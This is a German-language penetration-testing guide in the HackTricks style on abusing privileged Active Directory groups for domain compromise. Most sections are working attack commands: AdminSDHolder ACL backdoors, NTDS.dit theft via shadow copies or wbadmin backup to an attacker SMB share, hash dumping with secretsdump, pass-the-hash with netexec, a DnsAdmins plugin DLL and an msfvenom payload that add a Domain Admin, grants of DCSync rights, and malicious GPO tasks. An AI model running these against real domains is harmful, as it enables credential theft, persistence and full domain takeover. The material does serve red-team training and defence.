# Privilegierte Gruppen

{{#include ../../banners/hacktricks-training.md}}

## Bekannte Gruppen mit Administrationsrechten

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Diese Gruppe ist befugt, Konten und Gruppen zu erstellen, die auf der Domain keine Administratoren sind. Zusätzlich ermöglicht sie die lokale Anmeldung am Domain Controller (DC).

Um die Mitglieder dieser Gruppe zu identifizieren, wird der folgende Befehl ausgeführt:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Das Hinzufügen neuer Benutzer ist erlaubt, ebenso wie die lokale Anmeldung am DC.

## AdminSDHolder-Gruppe

Die Access Control List (ACL) der **AdminSDHolder**-Gruppe ist entscheidend, da sie die Berechtigungen für alle "geschützten Gruppen" innerhalb von Active Directory festlegt, einschließlich hoch privilegierter Gruppen. Dieser Mechanismus stellt die Sicherheit dieser Gruppen sicher, indem er unbefugte Änderungen verhindert.

Ein Angreifer könnte dies ausnutzen, indem er die ACL der **AdminSDHolder**-Gruppe verändert und einem normalen Benutzer Vollzugriff gewährt. Dadurch hätte dieser Benutzer effektiv die volle Kontrolle über alle geschützten Gruppen. Werden die Berechtigungen dieses Benutzers geändert oder entfernt, werden sie aufgrund des Systemdesigns innerhalb einer Stunde automatisch wiederhergestellt.

Aktuelle Windows Server-Dokumentation behandelt mehrere integrierte Operator-Gruppen weiterhin als **geschützte** Objekte (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, etc.). Der **SDProp**-Prozess läuft standardmäßig alle 60 Minuten auf dem **PDC Emulator**, setzt `adminCount=1` und deaktiviert die Vererbung bei geschützten Objekten. Das ist sowohl für Persistenz nützlich als auch beim Aufspüren veralteter privilegierter Benutzer, die aus einer geschützten Gruppe entfernt wurden, aber weiterhin die nicht vererbte ACL behalten.

Befehle zum Überprüfen der Mitglieder und zum Ändern der Berechtigungen umfassen:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Ein Skript steht zur Verfügung, um den Wiederherstellungsprozess zu beschleunigen: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Weitere Details finden Sie unter [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Die Mitgliedschaft in dieser Gruppe ermöglicht das Lesen gelöschter Active Directory-Objekte, was sensible Informationen offenbaren kann:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Das ist nützlich, um **vorherige Privilegienpfade wiederherzustellen**. Gelöschte Objekte können weiterhin `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, alte SPNs oder den DN einer gelöschten privilegierten Gruppe offenbaren, die später von einem anderen Operator wiederhergestellt werden kann.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Zugriff auf den Domänencontroller

Der Zugriff auf Dateien auf dem DC ist eingeschränkt, es sei denn, der Benutzer ist Mitglied der Gruppe `Server Operators`, die das Zugriffslevel ändert.

### Privilegieneskalation

Mit `PsService` oder `sc` von Sysinternals kann man Service-Berechtigungen einsehen und ändern. Die Gruppe `Server Operators` hat zum Beispiel volle Kontrolle über bestimmte Dienste, was die Ausführung beliebiger Befehle und eine Privilegieneskalation ermöglicht:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Dieser Befehl zeigt, dass `Server Operators` vollen Zugriff haben, wodurch die Manipulation von Diensten zur Erlangung von erhöhten Rechten möglich ist.

## Backup Operators

Die Mitgliedschaft in der Gruppe `Backup Operators` gewährt Zugriff auf das Dateisystem von `DC01` aufgrund der Rechte `SeBackup` und `SeRestore`. Diese Rechte ermöglichen das Durchsuchen von Ordnern, das Auflisten und Kopieren von Dateien, selbst ohne explizite Berechtigungen, indem das Flag `FILE_FLAG_BACKUP_SEMANTICS` verwendet wird. Für diesen Vorgang sind spezielle Skripte erforderlich.

Um Gruppenmitglieder aufzulisten, führen Sie aus:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Lokaler Angriff

Um diese Privilegien lokal auszunutzen, werden die folgenden Schritte durchgeführt:

1. Notwendige Bibliotheken importieren:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege` aktivieren und verifizieren:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Auf Dateien in eingeschränkten Verzeichnissen zugreifen und sie kopieren, zum Beispiel:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Direkter Zugriff auf das Dateisystem des Domain Controllers ermöglicht den Diebstahl der `NTDS.dit`-Datenbank, die alle NTLM-Hashes für Domänenbenutzer und -computer enthält.

#### Mit diskshadow.exe

1. Erstelle eine Schattenkopie des Laufwerks `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Kopiere `NTDS.dit` aus der Schattenkopie:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternativ verwenden Sie `robocopy` zum Kopieren von Dateien:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Extrahiere `SYSTEM` und `SAM` zur Hash-Ermittlung:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Alle hashes aus `NTDS.dit` abrufen:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Nach der Extraktion: Pass-the-Hash an DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Verwendung von wbadmin.exe

1. Richte ein NTFS-Dateisystem für den SMB-Server auf der Angreifer-Maschine ein und zwischenspeichere die SMB-Anmeldeinformationen auf der Zielmaschine.
2. Verwende `wbadmin.exe` für System-Backups und die Extraktion von `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Für eine praktische Demonstration siehe [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Mitglieder der **DnsAdmins**-Gruppe können ihre Privilegien ausnutzen, um eine beliebige DLL mit SYSTEM-Privilegien auf einem DNS-Server zu laden, der häufig auf Domänencontrollern gehostet wird. Diese Möglichkeit eröffnet erhebliches Potenzial zur Ausnutzung.

Um die Mitglieder der DnsAdmins-Gruppe aufzulisten, verwende:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Beliebige DLL ausführen (CVE‑2021‑40469)

> [!NOTE]
> Diese Schwachstelle ermöglicht die Ausführung beliebigen Codes mit SYSTEM-Privilegien im DNS-Dienst (normalerweise auf den Domain Controllern). Dieses Problem wurde 2021 behoben.

Mitglieder können den DNS-Server dazu bringen, eine beliebige DLL zu laden (entweder lokal oder von einer entfernten Freigabe), mit Befehlen wie:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Ein Neustart des DNS-Dienstes (der zusätzliche Berechtigungen erfordern kann) ist notwendig, damit die DLL geladen wird:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Für weitere Details zu diesem Angriffsvektor, siehe ired.team.

#### Mimilib.dll

Es ist auch möglich, mimilib.dll für die Ausführung von Befehlen zu verwenden, indem man sie so modifiziert, dass sie bestimmte Befehle oder reverse shells ausführt. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) für weitere Informationen.

### WPAD-Eintrag für MitM

DnsAdmins können DNS-Einträge manipulieren, um Man-in-the-Middle (MitM)-Angriffe durch Erstellen eines WPAD-Eintrags nach Deaktivierung der global query block list durchzuführen. Tools wie Responder oder Inveigh können zum Spoofing und Abfangen von Netzwerkverkehr verwendet werden.

### Event Log Readers

Mitglieder können auf Ereignisprotokolle zugreifen und dabei möglicherweise sensible Informationen finden, wie z. B. Klartext-Passwörter oder Details zur Befehlsausführung:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Berechtigungen

Diese Gruppe kann DACLs am Domain-Objekt ändern und dadurch möglicherweise DCSync-Berechtigungen gewähren. Techniken zur Privilegienerweiterung, die diese Gruppe ausnutzen, sind im Exchange-AD-Privesc GitHub-Repo detailliert beschrieben.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Wenn Sie als Mitglied dieser Gruppe agieren können, besteht der klassische Missbrauch darin, einem attacker-controlled principal die für [DCSync](dcsync.md) benötigten Replikationsrechte zu gewähren:
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Historisch hat **PrivExchange** Postfachzugriff, erzwungene Exchange-Authentifizierung und LDAP relay verknüpft, um auf denselben grundlegenden Mechanismus zu gelangen. Selbst dort, wo dieser Relay-Pfad entschärft ist, bleibt die direkte Mitgliedschaft in `Exchange Windows Permissions` oder die Kontrolle über einen Exchange server ein sehr wertvoller Weg zu Rechten für die Domänenreplikation.

## Hyper-V Administrators

Hyper-V Administrators haben vollen Zugriff auf Hyper-V, was ausgenutzt werden kann, um Kontrolle über virtualisierte Domänencontroller zu erlangen. Dazu gehört das Klonen laufender DCs und das Extrahieren von NTLM-Hashes aus der NTDS.dit-Datei.

### Ausbeutungsbeispiel

Die praktische Missbrauchsform ist in der Regel **Offline-Zugriff auf DC-Festplatten/Checkpoints** statt alter hostseitiger LPE-Tricks. Mit Zugriff auf den Hyper-V-Host kann ein Angreifer einen virtualisierten Domänencontroller checkpointen oder exportieren, das VHDX einhängen und `NTDS.dit`, `SYSTEM` und andere Geheimnisse extrahieren, ohne LSASS im Gast anzurühren:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Verwenden Sie von dort aus den `Backup Operators`-Workflow, um `Windows\NTDS\ntds.dit` und die Registry-Hives offline zu kopieren.

## Group Policy Creators Owners

Diese Gruppe erlaubt ihren Mitgliedern, Group Policies in der Domain zu erstellen. Allerdings können ihre Mitglieder Group Policies nicht auf Benutzer oder Gruppen anwenden oder bestehende GPOs bearbeiten.

Wichtig ist die Nuance, dass der **creator becomes owner of the new GPO** und in der Regel anschließend ausreichend Rechte hat, es zu bearbeiten. Das macht diese Gruppe interessant, wenn Sie entweder:

- eine bösartige GPO erstellen und einen Admin überzeugen, sie mit einer Ziel-OU/domain zu verknüpfen
- eine GPO bearbeiten, die Sie erstellt haben und die bereits irgendwo nützlich verlinkt ist
- ein anderes delegiertes Recht missbrauchen, das Ihnen erlaubt, GPOs zu verknüpfen, während diese Gruppe Ihnen die Edit-Seite gibt

Praktischer Missbrauch bedeutet normalerweise, über SYSVOL-backed policy files eine Änderung hinzuzufügen wie eine **Immediate Task**, **startup script**, **local admin membership**, oder **user rights assignment**.
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
Wenn die GPO manuell über `SYSVOL` bearbeitet wird, reicht die Änderung allein nicht aus: `versionNumber`, `GPT.ini` und manchmal `gPCMachineExtensionNames` müssen ebenfalls aktualisiert werden, sonst ignorieren die Clients die Richtlinienaktualisierung.

## Organization Management

In Umgebungen, in denen **Microsoft Exchange** eingesetzt ist, hat eine spezielle Gruppe namens **Organization Management** weitreichende Befugnisse. Diese Gruppe ist berechtigt, **auf die Postfächer aller Domain-Benutzer zuzugreifen**, und besitzt **volle Kontrolle über die Organizational Unit (OU) 'Microsoft Exchange Security Groups'**. Zu dieser Kontrolle gehört auch die Gruppe **`Exchange Windows Permissions`**, die zur Privilegieneskalation ausgenutzt werden kann.

### Privilegienausnutzung und Befehle

#### Print Operators

Mitglieder der Gruppe **Print Operators** verfügen über mehrere Privilegien, darunter das **`SeLoadDriverPrivilege`**, das ihnen erlaubt, sich **lokal an einem Domain Controller anzumelden**, diesen herunterzufahren und Drucker zu verwalten. Um diese Privilegien auszunutzen, insbesondere wenn **`SeLoadDriverPrivilege`** in einem nicht-elevated Kontext nicht sichtbar ist, ist ein Umgehen der User Account Control (UAC) erforderlich.

Um die Mitglieder dieser Gruppe aufzulisten, wird der folgende PowerShell-Befehl verwendet:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Auf Domain Controllern ist diese Gruppe gefährlich, weil die Standard-Domain-Controller-Richtlinie **`SeLoadDriverPrivilege`** an `Print Operators` gewährt. Wenn du ein erhöhtes Token für ein Mitglied dieser Gruppe erhältst, kannst du das Privileg aktivieren und einen signierten, aber verwundbaren Treiber laden, um in den Kernel/SYSTEM zu eskalieren. Für Details zur Token-Verarbeitung siehe [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Die Mitglieder dieser Gruppe erhalten Zugriff auf PCs über Remote Desktop Protocol (RDP). Um diese Mitglieder aufzulisten, stehen PowerShell-Befehle zur Verfügung:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Weitere Einblicke in das Ausnutzen von RDP finden sich in speziellen pentesting-Ressourcen.

#### Remote-Management-Benutzer

Mitglieder können über **Windows Remote Management (WinRM)** auf PCs zugreifen. Die Auflistung dieser Mitglieder erfolgt durch:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Für Exploitation-Techniken im Zusammenhang mit **WinRM** sollte spezifische Dokumentation konsultiert werden.

#### Server Operators

Diese Gruppe hat Berechtigungen, verschiedene Konfigurationen an Domain Controllers vorzunehmen, einschließlich Backup- und Restore-Privilegien, dem Ändern der Systemzeit und dem Herunterfahren des Systems. Um die Mitglieder aufzulisten, lautet der angegebene Befehl:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
Auf Domain Controllern erben `Server Operators` üblicherweise ausreichend Rechte, um **Dienste neu zu konfigurieren oder zu starten/stoppen** und erhalten außerdem durch die Standard-DC-Richtlinie `SeBackupPrivilege`/`SeRestorePrivilege`. In der Praxis macht sie das zu einer Brücke zwischen **service-control abuse** und **NTDS extraction**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Wenn eine Service-ACL dieser Gruppe Änder-/Startrechte gibt, weise den Service auf einen beliebigen Befehl, starte ihn als `LocalSystem` und stelle anschließend den ursprünglichen `binPath` wieder her. Wenn die Service-Kontrolle gesperrt ist, weiche auf die oben beschriebenen Techniken der `Backup Operators` zurück, um `NTDS.dit` zu kopieren.

## Quellen <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [https://labs.withsecure.com/tools/sharpgpoabuse](https://labs.withsecure.com/tools/sharpgpoabuse)


{{#include ../../banners/hacktricks-training.md}}
